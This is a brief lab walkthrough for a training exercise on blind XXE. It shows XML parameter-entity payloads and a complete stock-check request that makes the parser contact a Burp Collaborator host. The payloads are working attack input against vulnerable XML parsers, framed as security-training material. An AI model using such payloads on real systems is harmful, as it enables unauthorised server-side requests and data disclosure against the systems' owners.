# Blind XXE with out-of-band interaction via XML parameter entities
This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://2ruibhhghox7cp0i7q0y71p9e0ks8h.burpcollaborator.net"> %xxe; ]>

<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "2ruibhhghox7cp0i7q0y71p9e0ks8h.burpcollaborator.net"> %xxe; ]>

Final XML request:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://2ruibhhghox7cp0i7q0y71p9e0ks8h.burpcollaborator.net"> %xxe; ]>
<stockCheck>
<productId>2</productId><storeId>2</storeId></stockCheck>
